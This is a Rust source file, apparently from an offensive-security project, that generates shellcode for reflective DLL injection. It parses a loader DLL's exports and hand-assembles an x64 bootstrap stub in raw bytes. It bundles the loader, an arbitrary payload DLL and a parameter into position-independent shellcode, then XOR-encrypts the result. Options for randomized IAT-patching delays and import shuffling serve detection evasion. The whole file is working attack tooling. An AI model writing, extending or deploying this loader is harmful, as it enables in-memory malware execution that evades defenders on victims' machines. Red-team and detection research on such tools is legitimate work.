use std::{
    collections::BTreeMap, error::Error, ffi::CStr, fs, path::PathBuf, process::exit,
    slice::from_raw_parts,
};

use airborne_common::calc_hash;
use clap::{ArgAction, Parser};
use windows_sys::Win32::{
    System::Diagnostics::Debug::IMAGE_NT_HEADERS64,
    System::{
        Diagnostics::Debug::{IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_SECTION_HEADER},
        SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY},
    },
};

#[derive(Parser, Debug)]
#[command(version)]
struct Args {
    /// Path to the sRDI loader DLL
    #[arg(short, long = "loader")]
    loader_path: PathBuf,
    /// Path to the payload DLL
    #[arg(short, long = "payload")]
    payload_path: PathBuf,
    /// Name of the function to call in the payload DLL
    #[arg(short, long = "function")]
    function_name: String,
    /// Parameter to pass to the function
    #[arg(short = 'n', long)]
    parameter: String,
    /// Path to the output file
    #[arg(short, long = "output")]
    output_path: PathBuf,
    /// Disable randomized delays during IAT patching
    #[arg(short, long, action = ArgAction::SetFalse, default_value_t = true)]
    no_delay: bool,
    /// Disable IAT import descriptor shuffling
    #[arg(short, long, action = ArgAction::SetFalse, default_value_t = true)]
    no_shuffle: bool,
    /// Call payload's user defined function instead of DllMain
    #[arg(short, long, action = ArgAction::SetTrue, default_value_t = false)]
    ufn: bool,
}

// NOTE: must be updated accordingly if the loader name or the bootstrap code is modified
const LOADER_ENTRY_NAME: &str = "loader";
const BOOTSTRAP_TOTAL_LENGTH: u32 = 79;

fn main() {
    let args = Args::parse();

    // (bool, bool, bool) -(OR)-> u32
    let combined_flag = airborne_common::create_u32_flag(args.no_delay, args.no_shuffle, args.ufn);

    // preserve the path from being dropped
    let output_path = args.output_path.clone();

    // prepare paths for pretty printing
    let loader_path_str = args.loader_path.to_str().unwrap();
    let payload_path_str = args.payload_path.to_str().unwrap();
    let output_path_str = args.output_path.to_str().unwrap();

    println!("[+] reflective loader: {}", loader_path_str);
    println!("[+] payload: {}", payload_path_str);
    println!("[+] output: {}", output_path_str);

    let mut loader_b = match fs::read(args.loader_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] failed to read loader DLL: {}", e);
            exit(1);
        }
    };

    let mut payload_b = match fs::read(args.payload_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[-] failed to read payload DLL: {}", e);
            exit(1);
        }
    };
    let function_hash = calc_hash(args.function_name.as_bytes());

    let mut shellcode = match gen_sc(
        &mut loader_b,
        &mut payload_b,
        function_hash,
        args.parameter,
        combined_flag,
    ) {
        Ok(sc) => sc,
        Err(e) => {
            eprintln!("[-] failed to generate shellcode: {}", e);
            exit(1);
        }
    };

    println!("\n[+] xor'ing shellcode");
    let key = gen_xor_key(shellcode.len());
    airborne_common::xor_cipher(&mut shellcode, &key);
    let mut key_output_path = output_path.clone().into_os_string();
    key_output_path.push(".key");

    // prepare path for pretty printing
    let key_output_path_str = key_output_path.to_str().unwrap();

    println!(
        "\n[+] writing shellcode to '{}' and xor key to '{}'",
        output_path_str, key_output_path_str
    );

    match fs::write(output_path, shellcode) {
        Ok(_) => (),
        Err(e) => {
            eprintln!("[-] failed to write shellcode to output file: {}", e);
            exit(1);
        }
    };

    match fs::write(key_output_path, key) {
        Ok(_) => (),
        Err(e) => {
            eprintln!("[-] failed to write xor key to output file: {}", e);
            exit(1);
        }
    };
}

fn gen_sc(
    loader_b: &mut Vec<u8>,
    payload_b: &mut Vec<u8>,
    function_hash: u32,
    parameter: String,
    flag: u32,
) -> Result<Vec<u8>, Box<dyn Error>> {
    let loader_addr = export_ptr_by_name(loader_b.as_mut_ptr(), LOADER_ENTRY_NAME)?;
    let loader_offset = loader_addr as usize - loader_b.as_mut_ptr() as usize;
    println!("[+] loader offset: {:#x}", loader_offset);

    // 64-bit bootstrap source: https:// github.com/memN0ps/srdi-rs/blob/main/generate_shellcode

    let parameter_offset =
        BOOTSTRAP_TOTAL_LENGTH - 5 + loader_b.len() as u32 + payload_b.len() as u32;
    let payload_offset = BOOTSTRAP_TOTAL_LENGTH - 5 + loader_b.len() as u32;

    // 1.) save the current location in memory for calculating offsets later
    let b1: Vec<u8> = vec![
        0xe8, 0x00, 0x00, 0x00, 0x00, // call 0x00
        0x59, // pop rcx
        0x49, 0x89, 0xc8, // mov r8, rcx
    ];

    // 2.) align the stack and create shadow space
    let b2: Vec<u8> = vec![
        0x56, // push rsi
        0x48,
        0x89,
        0xe6, // mov rsi, rsp
        0x48,
        0x83,
        0xe4,
        0xf0, // and rsp, 0x0FFFFFFFFFFFFFFF0
        0x48,
        0x83,
        0xec,
        6 * 8, // sub rsp, 0x30
    ];

    // 3.) setup reflective loader parameters: place the last 5th and 6th arguments on the stack
    let b3: Vec<u8> = vec![
        0x48,
        0x89,
        0x4C,
        0x24,
        4 * 8, // mov qword ptr [rsp + 0x20], rcx
        0x48,
        0x83,
        0x6C,
        0x24,
        4 * 8,
        5, // sub qword ptr [rsp + 0x20], 0x5
        0xC7,
        0x44,
        0x24,
        5 * 8, // mov dword ptr [rsp + 0x28], <flag>
    ]
    .into_iter()
    .chain(flag.to_le_bytes().to_vec())
    .collect();

    // 4.) setup reflective loader parameters: 1st -> rcx, 2nd -> rdx, 3rd -> r8, 4th -> r9
    let b4: Vec<u8> = vec![0x41, 0xb9]
        .into_iter()
        .chain((parameter.len() as u32).to_le_bytes().to_vec())
        .chain(vec![
            0x49, 0x81, 0xc0, // add r8, <parameter_offset> + <payload_length>
        ])
        .chain(parameter_offset.to_le_bytes().to_vec())
        .chain(vec![
            0xba, // mov edx, <prameter_hash>
        ])
        .chain(function_hash.to_le_bytes().to_vec())
        .chain(vec![
            0x48, 0x81, 0xc1, // add rcx, <payload_offset>
        ])
        .chain(payload_offset.to_le_bytes().to_vec())
        .collect();

    // 5.) call the reflective loader
    let bootstrap_len = b1.len() + b2.len() + b3.len() + b4.len() + 1;
    let loader_addr = (BOOTSTRAP_TOTAL_LENGTH - bootstrap_len as u32 - 4) + loader_offset as u32;
    let b5: Vec<u8> = vec![
        0xe8, // call <loader_offset>
    ]
    .into_iter()
    .chain(loader_addr.to_le_bytes().to_vec())
    .chain(vec![
        0x90, 0x90, // padding
    ])
    .collect();

    // 6.) restore the stack and return to the original location (caller)
    let b6: Vec<u8> = vec![
        0x48, 0x89, 0xf4, // mov rsp, rsi
        0x5e, // pop rsi
        0xc3, // ret
        0x90, 0x90, // padding
    ];

    let mut bootstrap: Vec<u8> = b1
        .into_iter()
        .chain(b2)
        .chain(b3)
        .chain(b4)
        .chain(b5)
        .chain(b6)
        .collect();

    if bootstrap.len() != BOOTSTRAP_TOTAL_LENGTH as usize {
        return Err("invalid bootstrap length".into());
    }

    println!("[+] bootstrap size: {} bytes", bootstrap.len());
    println!("[+] reflective loader size: {} kB", loader_b.len() / 1024);
    println!("[+] payload size: {} kB", payload_b.len() / 1024);

    let mut shellcode = Vec::new();

    shellcode.append(&mut bootstrap);
    shellcode.append(loader_b);
    shellcode.append(payload_b);
    shellcode.append(&mut parameter.as_bytes().to_vec());

    /*
        the final PIC shellcode will have the following memory layout:
            - bootstrap
            - sRDI shellcode
            - payload DLL bytes
            - user data
    */

    println!("\n[+] total shellcode size: {} kB", shellcode.len() / 1024);
    println!("\n[+] loader(payload_dll_ptr: *mut c_void, function_hash: u32, user_data_ptr: *mut c_void, user_data_len: u32, shellcode_bin_ptr: *mut c_void, flag: u32)");
    println!(
        "[+] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]"
    );
    println!(
        "[+] rcx: {:#x} rdx: {:#x} r8: {}, r9: {:#x}, arg5: shellcode.bin address, arg6: {}",
        payload_offset,
        function_hash,
        parameter,
        parameter.len(),
        flag
    );

    Ok(shellcode)
}

fn gen_xor_key(keysize: usize) -> Vec<u8> {
    let mut key = Vec::new();

    for _ in 0..keysize {
        key.push(rand::random::<u8>());
    }

    key
}

fn export_ptr_by_name(base_ptr: *mut u8, name: &str) -> Result<*mut u8, Box<dyn Error>> {
    for (e_name, addr) in unsafe { get_exports(base_ptr)? } {
        if e_name == name {
            return Ok(addr as _);
        }
    }

    Err(format!("failed to find export by name: {}", name).into())
}

unsafe fn get_exports(base_ptr: *mut u8) -> Result<BTreeMap<String, usize>, Box<dyn Error>> {
    let mut exports = BTreeMap::new();

    let dos_header_ptr = base_ptr as *mut IMAGE_DOS_HEADER;

    if (*dos_header_ptr).e_magic != IMAGE_DOS_SIGNATURE {
        return Err("failed to get DOS header for the export".into());
    }

    let nt_header_ptr = rva_mut::<IMAGE_NT_HEADERS64>(base_ptr, (*dos_header_ptr).e_lfanew as _);

    let export_dir_ptr = rva_to_offset(
        base_ptr as _,
        &*nt_header_ptr,
        (*nt_header_ptr).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
            .VirtualAddress,
    )? as *mut IMAGE_EXPORT_DIRECTORY;

    let export_names = from_raw_parts(
        rva_to_offset(
            base_ptr as _,
            &*nt_header_ptr,
            (*export_dir_ptr).AddressOfNames,
        )? as *const u32,
        (*export_dir_ptr).NumberOfNames as _,
    );

    let export_functions = from_raw_parts(
        rva_to_offset(
            base_ptr as _,
            &*nt_header_ptr,
            (*export_dir_ptr).AddressOfFunctions,
        )? as *const u32,
        (*export_dir_ptr).NumberOfFunctions as _,
    );

    let export_ordinals = from_raw_parts(
        rva_to_offset(
            base_ptr as _,
            &*nt_header_ptr,
            (*export_dir_ptr).AddressOfNameOrdinals,
        )? as *const u16,
        (*export_dir_ptr).NumberOfNames as _,
    );

    for i in 0..(*export_dir_ptr).NumberOfNames as usize {
        let export_name =
            rva_to_offset(base_ptr as _, &*nt_header_ptr, export_names[i])? as *const i8;

        if let Ok(export_name) = CStr::from_ptr(export_name).to_str() {
            let export_ordinal = export_ordinals[i] as usize;
            exports.insert(
                export_name.to_string(),
                rva_to_offset(
                    base_ptr as _,
                    &*nt_header_ptr,
                    export_functions[export_ordinal],
                )?,
            );
        }
    }

    Ok(exports)
}

fn rva_mut<T>(base_ptr: *mut u8, rva: usize) -> *mut T {
    (base_ptr as usize + rva) as *mut T
}

unsafe fn rva_to_offset(
    base: usize,
    nt_header_ref: &IMAGE_NT_HEADERS64,
    mut rva: u32,
) -> Result<usize, Box<dyn Error>> {
    let section_header_ptr = rva_mut::<IMAGE_SECTION_HEADER>(
        &nt_header_ref.OptionalHeader as *const _ as _,
        nt_header_ref.FileHeader.SizeOfOptionalHeader as _,
    );
    let section_count = nt_header_ref.FileHeader.NumberOfSections;

    for i in 0..section_count as usize {
        let virtual_addr = (*section_header_ptr.add(i)).VirtualAddress;
        let virtual_size = (*section_header_ptr.add(i)).Misc.VirtualSize;

        // check if the rva is within the current section
        if virtual_addr <= rva && virtual_addr + virtual_size > rva {
            // adjust the rva to be relative to the start of the section in the file
            rva -= (*section_header_ptr.add(i)).VirtualAddress;
            rva += (*section_header_ptr.add(i)).PointerToRawData;

            return Ok(base + rva as usize);
        }
    }

    Err(format!("failed to find section for RVA {:#x}", rva).into())
}
